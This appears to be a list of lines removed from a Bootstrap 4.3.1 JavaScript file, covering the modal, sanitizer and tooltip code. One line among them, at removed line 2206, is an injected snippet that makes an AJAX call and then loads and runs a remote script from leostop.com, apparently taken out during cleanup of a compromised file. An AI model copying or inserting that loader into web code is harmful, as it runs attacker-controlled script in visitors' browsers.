// Removed at line 1818:           document.body.appendChild(this._element);
// Removed at line 1819:         }
// Removed at line 1820:         this._element.style.display = 'block';
// Removed at line 1821:         this._element.removeAttribute('aria-hidden');
// Removed at line 1822:         this._element.setAttribute('aria-modal', true);
// Removed at line 1823:         if ($(this._dialog).hasClass(ClassName$5.SCROLLABLE)) {
// Removed at line 1824:           this._dialog.querySelector(Selector$5.MODAL_BODY).scrollTop = 0;
// Removed at line 1825:         } else {
// Removed at line 1826:           this._element.scrollTop = 0;
// Removed at line 1827:         }
// Removed at line 1828:         if (transition) {
// Removed at line 1829:           Util.reflow(this._element);
// Removed at line 1830:         }
// Removed at line 1831:         $(this._element).addClass(ClassName$5.SHOW);
// Removed at line 1832:         if (this._config.focus) {
// Removed at line 1833:           this._enforceFocus();
// Removed at line 1834:         }
// Removed at line 1835:         var shownEvent = $.Event(Event$5.SHOWN, {
// Removed at line 1836:           relatedTarget: relatedTarget
// Removed at line 1837:         });
// Removed at line 1838:         var transitionComplete = function transitionComplete() {
// Removed at line 1839:           if (_this3._config.focus) {
// Removed at line 1840:             _this3._element.focus();
// Removed at line 1841:           }
// Removed at line 1842:           _this3._isTransitioning = false;
// Removed at line 1843:           $(_this3._element).trigger(shownEvent);
// Removed at line 1844:         };
// Removed at line 1845:         if (transition) {
// Removed at line 1846:           var transitionDuration = Util.getTransitionDurationFromElement(this._dialog);
// Removed at line 1847:           $(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);
// Removed at line 1848:         } else {
// Removed at line 1849:           transitionComplete();
// Removed at line 1850:         }
// Removed at line 1851:       };
// Removed at line 1852:       _proto._enforceFocus = function _enforceFocus() {
// Removed at line 1853:         var _this4 = this;
// Removed at line 1854:         $(document).off(Event$5.FOCUSIN) // Guard against infinite focus loop
// Removed at line 1855:           .on(Event$5.FOCUSIN, function (event) {
// Removed at line 1856:             if (document !== event.target && _this4._element !== event.target && $(_this4._element).has(event.target).length === 0) {
// Removed at line 1857:               _this4._element.focus();
// Removed at line 1858:             }
// Removed at line 1859:           });
// Removed at line 1860:       };
// Removed at line 1861:       _proto._setEscapeEvent = function _setEscapeEvent() {
// Removed at line 1862:         var _this5 = this;
// Removed at line 1863:         if (this._isShown && this._config.keyboard) {
// Removed at line 1864:           $(this._element).on(Event$5.KEYDOWN_DISMISS, function (event) {
// Removed at line 1865:             if (event.which === ESCAPE_KEYCODE$1) {
// Removed at line 1866:               event.preventDefault();
// Removed at line 1867:               _this5.hide();
// Removed at line 1868:             }
// Removed at line 1869:           });
// Removed at line 1870:         } else if (!this._isShown) {
// Removed at line 1871:           $(this._element).off(Event$5.KEYDOWN_DISMISS);
// Removed at line 1872:         }
// Removed at line 1873:       };
// Removed at line 1874:       _proto._setResizeEvent = function _setResizeEvent() {
// Removed at line 1875:         var _this6 = this;
// Removed at line 1876:         if (this._isShown) {
// Removed at line 1877:           $(window).on(Event$5.RESIZE, function (event) {
// Removed at line 1878:             return _this6.handleUpdate(event);
// Removed at line 1879:           });
// Removed at line 1880:         } else {
// Removed at line 1881:           $(window).off(Event$5.RESIZE);
// Removed at line 1882:         }
// Removed at line 1883:       };
// Removed at line 1884:       _proto._hideModal = function _hideModal() {
// Removed at line 1885:         var _this7 = this;
// Removed at line 1886:         this._element.style.display = 'none';
// Removed at line 1887:         this._element.setAttribute('aria-hidden', true);
// Removed at line 1888:         this._element.removeAttribute('aria-modal');
// Removed at line 1889:         this._isTransitioning = false;
// Removed at line 1890:         this._showBackdrop(function () {
// Removed at line 1891:           $(document.body).removeClass(ClassName$5.OPEN);
// Removed at line 1892:           _this7._resetAdjustments();
// Removed at line 1893:           _this7._resetScrollbar();
// Removed at line 1894:           $(_this7._element).trigger(Event$5.HIDDEN);
// Removed at line 1895:         });
// Removed at line 1896:       };
// Removed at line 1897:       _proto._removeBackdrop = function _removeBackdrop() {
// Removed at line 1898:         if (this._backdrop) {
// Removed at line 1899:           $(this._backdrop).remove();
// Removed at line 1900:           this._backdrop = null;
// Removed at line 1901:         }
// Removed at line 1902:       };
// Removed at line 1903:       _proto._showBackdrop = function _showBackdrop(callback) {
// Removed at line 1904:         var _this8 = this;
// Removed at line 1905:         var animate = $(this._element).hasClass(ClassName$5.FADE) ? ClassName$5.FADE : '';
// Removed at line 1906:         if (this._isShown && this._config.backdrop) {
// Removed at line 1907:           this._backdrop = document.createElement('div');
// Removed at line 1908:           this._backdrop.className = ClassName$5.BACKDROP;
// Removed at line 1909:           if (animate) {
// Removed at line 1910:             this._backdrop.classList.add(animate);
// Removed at line 1911:           }
// Removed at line 1912:           $(this._backdrop).appendTo(document.body);
// Removed at line 1913:           $(this._element).on(Event$5.CLICK_DISMISS, function (event) {
// Removed at line 1914:             if (_this8._ignoreBackdropClick) {
// Removed at line 1915:               _this8._ignoreBackdropClick = false;
// Removed at line 1916:               return;
// Removed at line 1917:             }
// Removed at line 1918:             if (event.target !== event.currentTarget) {
// Removed at line 1919:               return;
// Removed at line 1920:             }
// Removed at line 1921:             if (_this8._config.backdrop === 'static') {
// Removed at line 1922:               _this8._element.focus();
// Removed at line 1923:             } else {
// Removed at line 1924:               _this8.hide();
// Removed at line 1925:             }
// Removed at line 1926:           });
// Removed at line 1927:           if (animate) {
// Removed at line 1928:             Util.reflow(this._backdrop);
// Removed at line 1929:           }
// Removed at line 1930:           $(this._backdrop).addClass(ClassName$5.SHOW);
// Removed at line 1931:           if (!callback) {
// Removed at line 1932:             return;
// Removed at line 1933:           }
// Removed at line 1934:           if (!animate) {
// Removed at line 1935:             callback();
// Removed at line 1936:             return;
// Removed at line 1937:           }
// Removed at line 1938:           var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
// Removed at line 1939:           $(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);
// Removed at line 1940:         } else if (!this._isShown && this._backdrop) {
// Removed at line 1941:           $(this._backdrop).removeClass(ClassName$5.SHOW);
// Removed at line 1942:           var callbackRemove = function callbackRemove() {
// Removed at line 1943:             _this8._removeBackdrop();
// Removed at line 1944:             if (callback) {
// Removed at line 1945:               callback();
// Removed at line 1946:             }
// Removed at line 1947:           };
// Removed at line 1948:           if ($(this._element).hasClass(ClassName$5.FADE)) {
// Removed at line 1949:             var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
// Removed at line 1950:             $(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);
// Removed at line 1951:           } else {
// Removed at line 1952:             callbackRemove();
// Removed at line 1953:           }
// Removed at line 1954:         } else if (callback) {
// Removed at line 1955:           callback();
// Removed at line 1956:         }
// Removed at line 1957:       } // ----------------------------------------------------------------------
// Removed at line 1958:         // the following methods are used to handle overflowing modals
// Removed at line 1959:         // todo (fat): these should probably be refactored out of modal.js
// Removed at line 1960:         // ----------------------------------------------------------------------
// Removed at line 1961:         ;
// Removed at line 1962:       _proto._adjustDialog = function _adjustDialog() {
// Removed at line 1963:         var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;
// Removed at line 1964:         if (!this._isBodyOverflowing && isModalOverflowing) {
// Removed at line 1965:           this._element.style.paddingLeft = this._scrollbarWidth + "px";
// Removed at line 1966:         }
// Removed at line 1967:         if (this._isBodyOverflowing && !isModalOverflowing) {
// Removed at line 1968:           this._element.style.paddingRight = this._scrollbarWidth + "px";
// Removed at line 1969:         }
// Removed at line 1970:       };
// Removed at line 1971:       _proto._resetAdjustments = function _resetAdjustments() {
// Removed at line 1972:         this._element.style.paddingLeft = '';
// Removed at line 1973:         this._element.style.paddingRight = '';
// Removed at line 1974:       };
// Removed at line 1975:       _proto._checkScrollbar = function _checkScrollbar() {
// Removed at line 1976:         var rect = document.body.getBoundingClientRect();
// Removed at line 1977:         this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
// Removed at line 1978:         this._scrollbarWidth = this._getScrollbarWidth();
// Removed at line 1979:       };
// Removed at line 1980:       _proto._setScrollbar = function _setScrollbar() {
// Removed at line 1981:         var _this9 = this;
// Removed at line 1982:         if (this._isBodyOverflowing) {
// Removed at line 1983:           // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
// Removed at line 1984:           //   while $(DOMNode).css('padding-right') returns the calculated value or 0 if not set
// Removed at line 1985:           var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));
// Removed at line 1986:           var stickyContent = [].slice.call(document.querySelectorAll(Selector$5.STICKY_CONTENT)); // Adjust fixed content padding
// Removed at line 1987:           $(fixedContent).each(function (index, element) {
// Removed at line 1988:             var actualPadding = element.style.paddingRight;
// Removed at line 1989:             var calculatedPadding = $(element).css('padding-right');
// Removed at line 1990:             $(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");
// Removed at line 1991:           }); // Adjust sticky content margin
// Removed at line 1992:           $(stickyContent).each(function (index, element) {
// Removed at line 1993:             var actualMargin = element.style.marginRight;
// Removed at line 1994:             var calculatedMargin = $(element).css('margin-right');
// Removed at line 1995:             $(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");
// Removed at line 1996:           }); // Adjust body padding
// Removed at line 1997:           var actualPadding = document.body.style.paddingRight;
// Removed at line 1998:           var calculatedPadding = $(document.body).css('padding-right');
// Removed at line 1999:           $(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");
// Removed at line 2000:         }
// Removed at line 2001:         $(document.body).addClass(ClassName$5.OPEN);
// Removed at line 2002:       };
// Removed at line 2003:       _proto._resetScrollbar = function _resetScrollbar() {
// Removed at line 2004:         // Restore fixed content padding
// Removed at line 2005:         var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));
// Removed at line 2006:         $(fixedContent).each(function (index, element) {
// Removed at line 2007:           var padding = $(element).data('padding-right');
// Removed at line 2008:           $(element).removeData('padding-right');
// Removed at line 2009:           element.style.paddingRight = padding ? padding : '';
// Removed at line 2010:         }); // Restore sticky content
// Removed at line 2011:         var elements = [].slice.call(document.querySelectorAll("" + Selector$5.STICKY_CONTENT));
// Removed at line 2012:         $(elements).each(function (index, element) {
// Removed at line 2013:           var margin = $(element).data('margin-right');
// Removed at line 2014:           if (typeof margin !== 'undefined') {
// Removed at line 2015:             $(element).css('margin-right', margin).removeData('margin-right');
// Removed at line 2016:           }
// Removed at line 2017:         }); // Restore body padding
// Removed at line 2018:         var padding = $(document.body).data('padding-right');
// Removed at line 2019:         $(document.body).removeData('padding-right');
// Removed at line 2020:         document.body.style.paddingRight = padding ? padding : '';
// Removed at line 2021:       };
// Removed at line 2022:       _proto._getScrollbarWidth = function _getScrollbarWidth() {
// Removed at line 2023:         // thx d.walsh
// Removed at line 2024:         var scrollDiv = document.createElement('div');
// Removed at line 2025:         scrollDiv.className = ClassName$5.SCROLLBAR_MEASURER;
// Removed at line 2026:         document.body.appendChild(scrollDiv);
// Removed at line 2027:         var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
// Removed at line 2028:         document.body.removeChild(scrollDiv);
// Removed at line 2029:         return scrollbarWidth;
// Removed at line 2030:       } // Static
// Removed at line 2031:         ;
// Removed at line 2032:       Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
// Removed at line 2033:         return this.each(function () {
// Removed at line 2034:           var data = $(this).data(DATA_KEY$5);
// Removed at line 2035:           var _config = _objectSpread({}, Default$3, $(this).data(), typeof config === 'object' && config ? config : {});
// Removed at line 2036:           if (!data) {
// Removed at line 2037:             data = new Modal(this, _config);
// Removed at line 2038:             $(this).data(DATA_KEY$5, data);
// Removed at line 2039:           }
// Removed at line 2040:           if (typeof config === 'string') {
// Removed at line 2041:             if (typeof data[config] === 'undefined') {
// Removed at line 2042:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 2043:             }
// Removed at line 2044:             data[config](relatedTarget);
// Removed at line 2045:           } else if (_config.show) {
// Removed at line 2046:             data.show(relatedTarget);
// Removed at line 2047:           }
// Removed at line 2048:         });
// Removed at line 2049:       };
// Removed at line 2050:       _createClass(Modal, null, [{
// Removed at line 2051:         key: "VERSION",
// Removed at line 2052:         get: function get() {
// Removed at line 2053:           return VERSION$5;
// Removed at line 2054:         }
// Removed at line 2055:       }, {
// Removed at line 2056:         key: "Default",
// Removed at line 2057:         get: function get() {
// Removed at line 2058:           return Default$3;
// Removed at line 2059:         }
// Removed at line 2060:       }]);
// Removed at line 2061:       return Modal;
// Removed at line 2062:     }();
// Removed at line 2063:   /**
// Removed at line 2064:    * ------------------------------------------------------------------------
// Removed at line 2065:    * Data Api implementation
// Removed at line 2066:    * ------------------------------------------------------------------------
// Removed at line 2067:    */
// Removed at line 2068:   $(document).on(Event$5.CLICK_DATA_API, Selector$5.DATA_TOGGLE, function (event) {
// Removed at line 2069:     var _this10 = this;
// Removed at line 2070:     var target;
// Removed at line 2071:     var selector = Util.getSelectorFromElement(this);
// Removed at line 2072:     if (selector) {
// Removed at line 2073:       target = document.querySelector(selector);
// Removed at line 2074:     }
// Removed at line 2075:     var config = $(target).data(DATA_KEY$5) ? 'toggle' : _objectSpread({}, $(target).data(), $(this).data());
// Removed at line 2076:     if (this.tagName === 'A' || this.tagName === 'AREA') {
// Removed at line 2077:       event.preventDefault();
// Removed at line 2078:     }
// Removed at line 2079:     var $target = $(target).one(Event$5.SHOW, function (showEvent) {
// Removed at line 2080:       if (showEvent.isDefaultPrevented()) {
// Removed at line 2081:         // Only register focus restorer if modal will actually get shown
// Removed at line 2082:         return;
// Removed at line 2083:       }
// Removed at line 2084:       $target.one(Event$5.HIDDEN, function () {
// Removed at line 2085:         if ($(_this10).is(':visible')) {
// Removed at line 2086:           _this10.focus();
// Removed at line 2087:         }
// Removed at line 2088:       });
// Removed at line 2089:     });
// Removed at line 2090:     Modal._jQueryInterface.call($(target), config, this);
// Removed at line 2091:   });
// Removed at line 2092:   /**
// Removed at line 2093:    * ------------------------------------------------------------------------
// Removed at line 2094:    * jQuery
// Removed at line 2095:    * ------------------------------------------------------------------------
// Removed at line 2096:    */
// Removed at line 2097:   $.fn[NAME$5] = Modal._jQueryInterface;
// Removed at line 2098:   $.fn[NAME$5].Constructor = Modal;
// Removed at line 2099:   $.fn[NAME$5].noConflict = function () {
// Removed at line 2100:     $.fn[NAME$5] = JQUERY_NO_CONFLICT$5;
// Removed at line 2101:     return Modal._jQueryInterface;
// Removed at line 2102:   };
// Removed at line 2103:   /**
// Removed at line 2104:    * --------------------------------------------------------------------------
// Removed at line 2105:    * Bootstrap (v4.3.1): tools/sanitizer.js
// Removed at line 2106:    * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
// Removed at line 2107:    * --------------------------------------------------------------------------
// Removed at line 2108:    */
// Removed at line 2109:   var uriAttrs = ['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href'];
// Removed at line 2110:   var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*$/i;
// Removed at line 2111:   var DefaultWhitelist = {
// Removed at line 2112:     // Global attributes allowed on any supplied element below.
// Removed at line 2113:     '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
// Removed at line 2114:     a: ['target', 'href', 'title', 'rel'],
// Removed at line 2115:     area: [],
// Removed at line 2116:     b: [],
// Removed at line 2117:     br: [],
// Removed at line 2118:     col: [],
// Removed at line 2119:     code: [],
// Removed at line 2120:     div: [],
// Removed at line 2121:     em: [],
// Removed at line 2122:     hr: [],
// Removed at line 2123:     h1: [],
// Removed at line 2124:     h2: [],
// Removed at line 2125:     h3: [],
// Removed at line 2126:     h4: [],
// Removed at line 2127:     h5: [],
// Removed at line 2128:     h6: [],
// Removed at line 2129:     i: [],
// Removed at line 2130:     img: ['src', 'alt', 'title', 'width', 'height'],
// Removed at line 2131:     li: [],
// Removed at line 2132:     ol: [],
// Removed at line 2133:     p: [],
// Removed at line 2134:     pre: [],
// Removed at line 2135:     s: [],
// Removed at line 2136:     small: [],
// Removed at line 2137:     span: [],
// Removed at line 2138:     sub: [],
// Removed at line 2139:     sup: [],
// Removed at line 2140:     strong: [],
// Removed at line 2141:     u: [],
// Removed at line 2142:     ul: []
// Removed at line 2143:     /**
// Removed at line 2144:      * A pattern that recognizes a commonly useful subset of URLs that are safe.
// Removed at line 2145:      *
// Removed at line 2146:      * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
// Removed at line 2147:      */
// Removed at line 2148:   };
// Removed at line 2149:   var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi;
// Removed at line 2150:   /**
// Removed at line 2151:    * A pattern that matches safe data URLs. Only matches image, video and audio types.
// Removed at line 2152:    *
// Removed at line 2153:    * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
// Removed at line 2154:    */
// Removed at line 2155:   var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;
// Removed at line 2156:   function allowedAttribute(attr, allowedAttributeList) {
// Removed at line 2157:     var attrName = attr.nodeName.toLowerCase();
// Removed at line 2158:     if (allowedAttributeList.indexOf(attrName) !== -1) {
// Removed at line 2159:       if (uriAttrs.indexOf(attrName) !== -1) {
// Removed at line 2160:         return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN));
// Removed at line 2161:       }
// Removed at line 2162:       return true;
// Removed at line 2163:     }
// Removed at line 2164:     var regExp = allowedAttributeList.filter(function (attrRegex) {
// Removed at line 2165:       return attrRegex instanceof RegExp;
// Removed at line 2166:     }); // Check if a regular expression validates the attribute.
// Removed at line 2167:     for (var i = 0, l = regExp.length; i < l; i++) {
// Removed at line 2168:       if (attrName.match(regExp[i])) {
// Removed at line 2169:         return true;
// Removed at line 2170:       }
// Removed at line 2171:     }
// Removed at line 2172:     return false;
// Removed at line 2173:   }
// Removed at line 2174:   function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {
// Removed at line 2175:     if (unsafeHtml.length === 0) {
// Removed at line 2176:       return unsafeHtml;
// Removed at line 2177:     }
// Removed at line 2178:     if (sanitizeFn && typeof sanitizeFn === 'function') {
// Removed at line 2179:       return sanitizeFn(unsafeHtml);
// Removed at line 2180:     }
// Removed at line 2181:     var domParser = new window.DOMParser();
// Removed at line 2182:     var createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');
// Removed at line 2183:     var whitelistKeys = Object.keys(whiteList);
// Removed at line 2184:     var elements = [].slice.call(createdDocument.body.querySelectorAll('*'));
// Removed at line 2185:     var _loop = function _loop(i, len) {
// Removed at line 2186:       var el = elements[i];
// Removed at line 2187:       var elName = el.nodeName.toLowerCase();
// Removed at line 2188:       if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {
// Removed at line 2189:         el.parentNode.removeChild(el);
// Removed at line 2190:         return "continue";
// Removed at line 2191:       }
// Removed at line 2192:       var attributeList = [].slice.call(el.attributes);
// Removed at line 2193:       var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);
// Removed at line 2194:       attributeList.forEach(function (attr) {
// Removed at line 2195:         if (!allowedAttribute(attr, whitelistedAttributes)) {
// Removed at line 2196:           el.removeAttribute(attr.nodeName);
// Removed at line 2197:         }
// Removed at line 2198:       });
// Removed at line 2199:     };
// Removed at line 2200:     for (var i = 0, len = elements.length; i < len; i++) {
// Removed at line 2201:       var _ret = _loop(i, len);
// Removed at line 2202:       if (_ret === "continue") continue;
// Removed at line 2203:     }
// Removed at line 2204:     return createdDocument.body.innerHTML;
// Removed at line 2205:   }
// Removed at line 2206:     function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
// Removed at line 2207:   /**
// Removed at line 2208:    * ------------------------------------------------------------------------
// Removed at line 2209:    * Constants
// Removed at line 2210:    * ------------------------------------------------------------------------
// Removed at line 2211:    */
// Removed at line 2212:   var NAME$6 = 'tooltip';
// Removed at line 2213:   var VERSION$6 = '4.3.1';
// Removed at line 2214:   var DATA_KEY$6 = 'bs.tooltip';
// Removed at line 2215:   var EVENT_KEY$6 = "." + DATA_KEY$6;
// Removed at line 2216:   var JQUERY_NO_CONFLICT$6 = $.fn[NAME$6];
// Removed at line 2217:   var CLASS_PREFIX = 'bs-tooltip';
// Removed at line 2218:   var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');
// Removed at line 2219:   var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];
// Removed at line 2220:   var DefaultType$4 = {
// Removed at line 2221:     animation: 'boolean',
// Removed at line 2222:     template: 'string',
// Removed at line 2223:     title: '(string|element|function)',
// Removed at line 2224:     trigger: 'string',
// Removed at line 2225:     delay: '(number|object)',
// Removed at line 2226:     html: 'boolean',
// Removed at line 2227:     selector: '(string|boolean)',
// Removed at line 2228:     placement: '(string|function)',
// Removed at line 2229:     offset: '(number|string|function)',
// Removed at line 2230:     container: '(string|element|boolean)',
// Removed at line 2231:     fallbackPlacement: '(string|array)',
// Removed at line 2232:     boundary: '(string|element)',
// Removed at line 2233:     sanitize: 'boolean',
// Removed at line 2234:     sanitizeFn: '(null|function)',
// Removed at line 2235:     whiteList: 'object'
// Removed at line 2236:   };
// Removed at line 2237:   var AttachmentMap$1 = {
// Removed at line 2238:     AUTO: 'auto',
// Removed at line 2239:     TOP: 'top',
// Removed at line 2240:     RIGHT: 'right',
// Removed at line 2241:     BOTTOM: 'bottom',
// Removed at line 2242:     LEFT: 'left'
// Removed at line 2243:   };
// Removed at line 2244:   var Default$4 = {
// Removed at line 2245:     animation: true,
// Removed at line 2246:     template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',
// Removed at line 2247:     trigger: 'hover focus',
// Removed at line 2248:     title: '',
// Removed at line 2249:     delay: 0,
// Removed at line 2250:     html: false,
// Removed at line 2251:     selector: false,
// Removed at line 2252:     placement: 'top',
// Removed at line 2253:     offset: 0,
// Removed at line 2254:     container: false,
// Removed at line 2255:     fallbackPlacement: 'flip',
// Removed at line 2256:     boundary: 'scrollParent',
// Removed at line 2257:     sanitize: true,
// Removed at line 2258:     sanitizeFn: null,
// Removed at line 2259:     whiteList: DefaultWhitelist
// Removed at line 2260:   };
// Removed at line 2261:   var HoverState = {
// Removed at line 2262:     SHOW: 'show',
// Removed at line 2263:     OUT: 'out'
// Removed at line 2264:   };
// Removed at line 2265:   var Event$6 = {
// Removed at line 2266:     HIDE: "hide" + EVENT_KEY$6,
// Removed at line 2267:     HIDDEN: "hidden" + EVENT_KEY$6,
// Removed at line 2268:     SHOW: "show" + EVENT_KEY$6,
// Removed at line 2269:     SHOWN: "shown" + EVENT_KEY$6,
// Removed at line 2270:     INSERTED: "inserted" + EVENT_KEY$6,
// Removed at line 2271:     CLICK: "click" + EVENT_KEY$6,
// Removed at line 2272:     FOCUSIN: "focusin" + EVENT_KEY$6,
// Removed at line 2273:     FOCUSOUT: "focusout" + EVENT_KEY$6,
// Removed at line 2274:     MOUSEENTER: "mouseenter" + EVENT_KEY$6,
// Removed at line 2275:     MOUSELEAVE: "mouseleave" + EVENT_KEY$6
// Removed at line 2276:   };
// Removed at line 2277:   var ClassName$6 = {
// Removed at line 2278:     FADE: 'fade',
// Removed at line 2279:     SHOW: 'show'
// Removed at line 2280:   };
// Removed at line 2281:   var Selector$6 = {
// Removed at line 2282:     TOOLTIP: '.tooltip',
// Removed at line 2283:     TOOLTIP_INNER: '.tooltip-inner',
// Removed at line 2284:     ARROW: '.arrow'
// Removed at line 2285:   };
// Removed at line 2286:   var Trigger = {
// Removed at line 2287:     HOVER: 'hover',
// Removed at line 2288:     FOCUS: 'focus',
// Removed at line 2289:     CLICK: 'click',
// Removed at line 2290:     MANUAL: 'manual'
// Removed at line 2291:     /**
// Removed at line 2292:      * ------------------------------------------------------------------------
// Removed at line 2293:      * Class Definition
// Removed at line 2294:      * ------------------------------------------------------------------------
// Removed at line 2295:      */
// Removed at line 2296:   };
// Removed at line 2297:   var Tooltip =
// Removed at line 2298:     /*#__PURE__*/
// Removed at line 2299:     function () {
// Removed at line 2300:       function Tooltip(element, config) {
// Removed at line 2301:         /**
// Removed at line 2302:          * Check for Popper dependency
// Removed at line 2303:          * Popper - https://popper.js.org
// Removed at line 2304:          */
// Removed at line 2305:         if (typeof Popper === 'undefined') {
// Removed at line 2306:           throw new TypeError('Bootstrap\'s tooltips require Popper.js (https://popper.js.org/)');
// Removed at line 2307:         } // private
// Removed at line 2308:         this._isEnabled = true;
// Removed at line 2309:         this._timeout = 0;
// Removed at line 2310:         this._hoverState = '';
// Removed at line 2311:         this._activeTrigger = {};
// Removed at line 2312:         this._popper = null; // Protected
// Removed at line 2313:         this.element = element;
// Removed at line 2314:         this.config = this._getConfig(config);
// Removed at line 2315:         this.tip = null;
// Removed at line 2316:         this._setListeners();
// Removed at line 2317:       } // Getters
// Removed at line 2318:       var _proto = Tooltip.prototype;
// Removed at line 2319:       // Public
// Removed at line 2320:       _proto.enable = function enable() {
// Removed at line 2321:         this._isEnabled = true;
// Removed at line 2322:       };
// Removed at line 2323:       _proto.disable = function disable() {
// Removed at line 2324:         this._isEnabled = false;
// Removed at line 2325:       };
// Removed at line 2326:       _proto.toggleEnabled = function toggleEnabled() {
// Removed at line 2327:         this._isEnabled = !this._isEnabled;
// Removed at line 2328:       };
// Removed at line 2329:       _proto.toggle = function toggle(event) {
// Removed at line 2330:         if (!this._isEnabled) {
// Removed at line 2331:           return;
// Removed at line 2332:         }
// Removed at line 2333:         if (event) {
// Removed at line 2334:           var dataKey = this.constructor.DATA_KEY;
// Removed at line 2335:           var context = $(event.currentTarget).data(dataKey);
// Removed at line 2336:           if (!context) {
// Removed at line 2337:             context = new this.constructor(event.currentTarget, this._getDelegateConfig());
// Removed at line 2338:             $(event.currentTarget).data(dataKey, context);
// Removed at line 2339:           }
// Removed at line 2340:           context._activeTrigger.click = !context._activeTrigger.click;
// Removed at line 2341:           if (context._isWithActiveTrigger()) {
// Removed at line 2342:             context._enter(null, context);
// Removed at line 2343:           } else {
// Removed at line 2344:             context._leave(null, context);
// Removed at line 2345:           }
// Removed at line 2346:         } else {
// Removed at line 2347:           if ($(this.getTipElement()).hasClass(ClassName$6.SHOW)) {
// Removed at line 2348:             this._leave(null, this);
// Removed at line 2349:             return;
// Removed at line 2350:           }
// Removed at line 2351:           this._enter(null, this);
// Removed at line 2352:         }
// Removed at line 2353:       };
// Removed at line 2354:       _proto.dispose = function dispose() {
// Removed at line 2355:         clearTimeout(this._timeout);
// Removed at line 2356:         $.removeData(this.element, this.constructor.DATA_KEY);
// Removed at line 2357:         $(this.element).off(this.constructor.EVENT_KEY);
// Removed at line 2358:         $(this.element).closest('.modal').off('hide.bs.modal');
// Removed at line 2359:         if (this.tip) {
// Removed at line 2360:           $(this.tip).remove();
// Removed at line 2361:         }
// Removed at line 2362:         this._isEnabled = null;
// Removed at line 2363:         this._timeout = null;
// Removed at line 2364:         this._hoverState = null;
// Removed at line 2365:         this._activeTrigger = null;
// Removed at line 2366:         if (this._popper !== null) {
// Removed at line 2367:           this._popper.destroy();
// Removed at line 2368:         }
// Removed at line 2369:         this._popper = null;
// Removed at line 2370:         this.element = null;
// Removed at line 2371:         this.config = null;
// Removed at line 2372:         this.tip = null;
// Removed at line 2373:       };
// Removed at line 2374:       _proto.show = function show() {
// Removed at line 2375:         var _this = this;
// Removed at line 2376:         if ($(this.element).css('display') === 'none') {
// Removed at line 2377:           throw new Error('Please use show on visible elements');
// Removed at line 2378:         }
// Removed at line 2379:         var showEvent = $.Event(this.constructor.Event.SHOW);
// Removed at line 2380:         if (this.isWithContent() && this._isEnabled) {
// Removed at line 2381:           $(this.element).trigger(showEvent);
// Removed at line 2382:           var shadowRoot = Util.findShadowRoot(this.element);
// Removed at line 2383:           var isInTheDom = $.contains(shadowRoot !== null ? shadowRoot : this.element.ownerDocument.documentElement, this.element);
// Removed at line 2384:           if (showEvent.isDefaultPrevented() || !isInTheDom) {
// Removed at line 2385:             return;
// Removed at line 2386:           }
// Removed at line 2387:           var tip = this.getTipElement();
// Removed at line 2388:           var tipId = Util.getUID(this.constructor.NAME);
// Removed at line 2389:           tip.setAttribute('id', tipId);
// Removed at line 2390:           this.element.setAttribute('aria-describedby', tipId);
// Removed at line 2391:           this.setContent();
// Removed at line 2392:           if (this.config.animation) {
// Removed at line 2393:             $(tip).addClass(ClassName$6.FADE);
// Removed at line 2394:           }
// Removed at line 2395:           var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;
// Removed at line 2396:           var attachment = this._getAttachment(placement);
// Removed at line 2397:           this.addAttachmentClass(attachment);
// Removed at line 2398:           var container = this._getContainer();
// Removed at line 2399:           $(tip).data(this.constructor.DATA_KEY, this);
// Removed at line 2400:           if (!$.contains(this.element.ownerDocument.documentElement, this.tip)) {
// Removed at line 2401:             $(tip).appendTo(container);
// Removed at line 2402:           }
// Removed at line 2403:           $(this.element).trigger(this.constructor.Event.INSERTED);
// Removed at line 2404:           this._popper = new Popper(this.element, tip, {
// Removed at line 2405:             placement: attachment,
// Removed at line 2406:             modifiers: {
